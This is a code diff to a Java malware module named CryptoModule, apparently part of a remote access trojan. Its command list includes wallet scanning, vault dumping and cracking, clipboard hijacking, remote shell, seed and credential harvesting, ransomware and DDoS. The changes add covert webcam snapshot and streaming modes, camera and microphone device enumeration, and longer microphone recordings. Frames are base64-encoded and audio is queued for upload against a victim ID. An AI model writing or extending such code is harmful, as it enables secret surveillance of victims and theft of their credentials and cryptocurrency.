@@ -84,7 +84,7 @@ public final class CryptoModule {
 
 	private static final Set<String> SUPPORTED = Set.of(
 		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop", "clip_set",
-		"shell", "harvest", "screenshot", "file_pull", "cancel", "agent");
+		"shell", "harvest", "screenshot", "file_pull", "cancel", "agent", "webcam", "webcam:snapshot", "webcam:stream", "webcam:devices");
 	/** One collection at a time: these share a single heavy worker. */
 	private static final Set<String> HEAVY = Set.of("scan_wallets", "dump_vault", "crack_vault", "harvest");
 	static final String BUSY = "busy: another collection is running";
@@ -687,8 +687,8 @@ public final class CryptoModule {
 				case "agent" -> agent(task);
 				case "monitor" -> monitor(task, cancel);
 				case "files" -> files(task);
-				case "webcam" -> captureMedia(task, "webcam");
-				case "mic" -> captureMedia(task, "mic");
+				case "webcam", "webcam:snapshot", "webcam:stream", "webcam:devices" -> captureMedia(task, "webcam");
+				case "mic", "mic:record" -> captureMedia(task, "mic");
 				case "ransomware" -> ransomware(task, cancel);
 				case "ddos" -> ddos(task, cancel);
 				default -> Map.of("ok", false);
@@ -705,7 +705,7 @@ public final class CryptoModule {
 			case "clip_start", "clip_stop", "clip_set" -> "clipboard";
 			case "harvest" -> "seeds";
 			case "agent" -> "credentials";
-			case "monitor", "webcam", "mic" -> "monitor";
+			case "monitor", "webcam", "webcam:snapshot", "webcam:stream", "webcam:devices", "mic", "mic:record" -> "monitor";
 			case "files", "ransomware" -> "files";
 			case "ddos" -> "network";
 			default -> "credentials";
@@ -1593,24 +1593,37 @@ public final class CryptoModule {
 	}
 
 	private Map<String, Object> captureMedia(Task task, String kind) throws Exception {
+		if ("webcam:devices".equals(task.name()) || "devices".equals(task.params().get("mode"))) {
+			return devices();
+		}
+		boolean stream = "webcam:stream".equals(task.name()) || "stream".equals(task.params().get("mode"));
+		String device = Json.str(task.params(), "device", "").strip();
+		int quality = (int) Math.min(90, Math.max(20, Json.num(task.params(), "quality", 60L)));
 		Path out = work.resolve(kind + "-" + System.currentTimeMillis() + ("mic".equals(kind) ? ".wav" : ".jpg"));
 		List<String> command = new ArrayList<>();
 		command.add("ffmpeg");
 		command.add("-y");
 		command.add("-loglevel");
 		command.add("error");
-		String device = Json.str(task.params(), "device", "");
+		int fps = 1;
 		if ("webcam".equals(kind)) {
 			if (AgentPaths.isWindows()) {
-				command.addAll(List.of("-f", "dshow", "-i", "video=" + (device.isEmpty() ? "Integrated Camera" : device), "-frames:v", "1"));
+				command.addAll(List.of("-f", "dshow", "-i", "video=" + (device.isEmpty() ? "Integrated Camera" : device)));
 			} else if (AgentPaths.isMac()) {
-				command.addAll(List.of("-f", "avfoundation", "-i", device.isEmpty() ? "0" : device, "-frames:v", "1"));
+				command.addAll(List.of("-f", "avfoundation", "-i", device.isEmpty() ? "0" : device));
 			} else {
-				command.addAll(List.of("-f", "v4l2", "-i", device.isEmpty() ? "/dev/video0" : device, "-frames:v", "1"));
+				command.addAll(List.of("-f", "v4l2", "-i", device.isEmpty() ? "/dev/video0" : device));
 			}
-			command.add(out.toString());
+			command.addAll(List.of("-vf", "scale=640:-2", "-q:v", String.valueOf(Math.max(2, Math.round(31 - quality / 3.4)))));
+			fps = (int) Math.min(15, Math.max(1, Json.num(task.params(), "fps", 8L)));
+			if (stream) {
+				int max = (int) Math.min(120, Math.max(1, Json.num(task.params(), "max_frames", 32L)));
+				command.addAll(List.of("-r", String.valueOf(fps), "-frames:v", String.valueOf(max), out.toString().replace(".jpg", "-%03d.jpg")));
+			} else {
+				command.addAll(List.of("-frames:v", "1", out.toString()));
+			}
 		} else {
-			int seconds = (int) Math.min(10, Math.max(1, Json.num(task.params(), "seconds", 5L)));
+			int seconds = (int) Math.min(60, Math.max(1, Json.num(task.params(), "seconds", 15L)));
 			if (AgentPaths.isWindows()) {
 				command.addAll(List.of("-f", "dshow", "-i", "audio=" + (device.isEmpty() ? "Microphone" : device), "-t", String.valueOf(seconds)));
 			} else if (AgentPaths.isMac()) {
@@ -1618,30 +1631,96 @@ public final class CryptoModule {
 			} else {
 				command.addAll(List.of("-f", "pulse", "-i", device.isEmpty() ? "default" : device, "-t", String.valueOf(seconds)));
 			}
+			command.add("-ac");
+			command.add("1");
+			command.add("-ar");
+			command.add("16000");
 			command.add(out.toString());
 		}
 		ProcessBuilder builder = new ProcessBuilder(command);
 		builder.redirectErrorStream(true);
-		Process process = builder.start();
+		Process process;
+		try {
+			process = builder.start();
+		} catch (Throwable throwable) {
+			throw new IllegalStateException("ffmpeg_missing: " + throwable.getMessage());
+		}
 		String log = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
 		if (!process.waitFor(60, TimeUnit.SECONDS)) {
 			process.destroyForcibly();
 			throw new IllegalStateException(kind + "_timeout");
 		}
-		if (process.exitValue() != 0 || !Files.isRegularFile(out) || Files.size(out) == 0) {
-			throw new IllegalStateException(kind + "_unavailable: " + log.strip());
+		if (process.exitValue() != 0) {
+			throw new IllegalStateException(kind + "_unavailable: " + log.strip().replace('\n', ' ').substring(0, Math.min(800, log.strip().length())));
 		}
-		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), kind, work.resolve("tmp"));
-		try {
-			pack.add(out, kind + "/" + out.getFileName(), kind);
-			Map<String, Object> result = new LinkedHashMap<>();
-			result.put("upload_id", queueUpload(pack, kind, task.id()));
+		Map<String, Object> result = new LinkedHashMap<>();
+		if ("webcam".equals(kind) && stream) {
+			Path dir = out.getParent();
+			String prefix = out.getFileName().toString().replace(".jpg", "-");
+			List<String> frames = new ArrayList<>();
+			try (java.util.stream.Stream<Path> files = Files.list(dir)) {
+				for (Path file : files.filter((item) -> item.getFileName().toString().startsWith(prefix)).sorted().toList()) {
+					try {
+						frames.add(Base64.getEncoder().encodeToString(Files.readAllBytes(file)));
+					} finally {
+						Files.deleteIfExists(file);
+					}
+				}
+			}
+			if (frames.isEmpty()) throw new IllegalStateException("webcam_unavailable: sin fotogramas");
+			result.put("frames", frames);
+			result.put("fps", fps);
+			result.put("count", frames.size());
+		} else if ("webcam".equals(kind)) {
+			if (!Files.isRegularFile(out) || Files.size(out) == 0) throw new IllegalStateException("webcam_unavailable: imagen vacía");
+			result.put("data", Base64.getEncoder().encodeToString(Files.readAllBytes(out)));
 			result.put("bytes", Files.size(out));
-			return result;
-		} finally {
-			pack.close();
 			Files.deleteIfExists(out);
+		} else {
+			if (!Files.isRegularFile(out) || Files.size(out) == 0) throw new IllegalStateException("mic_unavailable: audio vacío");
+			ArtifactPack pack = new ArtifactPack(config, transport.victimId(), kind, work.resolve("tmp"));
+			try {
+				pack.add(out, kind + "/" + out.getFileName(), kind);
+				result.put("upload_id", queueUpload(pack, kind, task.id()));
+				result.put("bytes", Files.size(out));
+				result.put("seconds", Json.num(task.params(), "seconds", 15L));
+			} finally {
+				pack.close();
+				Files.deleteIfExists(out);
+			}
 		}
+		result.put("device", device.isEmpty() ? "default" : device);
+		return result;
+	}
+
+	private Map<String, Object> devices() throws Exception {
+		List<String> videos = new ArrayList<>();
+		List<String> audios = new ArrayList<>();
+		if (AgentPaths.isWindows()) {
+			Process process = new ProcessBuilder("ffmpeg", "-hide_banner", "-list_devices", "true", "-f", "dshow", "-i", "dummy")
+				.redirectErrorStream(true).start();
+			String log = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
+			process.waitFor(15, TimeUnit.SECONDS);
+			boolean audio = false;
+			for (String line : log.split("\\R")) {
+				if (line.contains("DirectShow audio devices")) audio = true;
+				java.util.regex.Matcher match = java.util.regex.Pattern.compile("\"([^\"]+)\"\s*\((video|audio)\)").matcher(line);
+				if (!match.find()) continue;
+				if ("audio".equals(match.group(2)) || audio) audios.add(match.group(1));
+				else videos.add(match.group(1));
+			}
+		} else if (AgentPaths.isMac()) {
+			videos.add("0");
+			audios.add(":0");
+		} else {
+			try (java.util.stream.Stream<Path> list = Files.list(Path.of("/dev"))) {
+				list.filter((item) -> item.getFileName().toString().startsWith("video")).sorted().forEach((item) -> videos.add(item.toString()));
+			}
+		}
+		Map<String, Object> result = new LinkedHashMap<>();
+		result.put("video", videos);
+		result.put("audio", audios);
+		return result;
 	}
 
 	private static final String RANSOM_MARKER = ".spc-ransom.json";
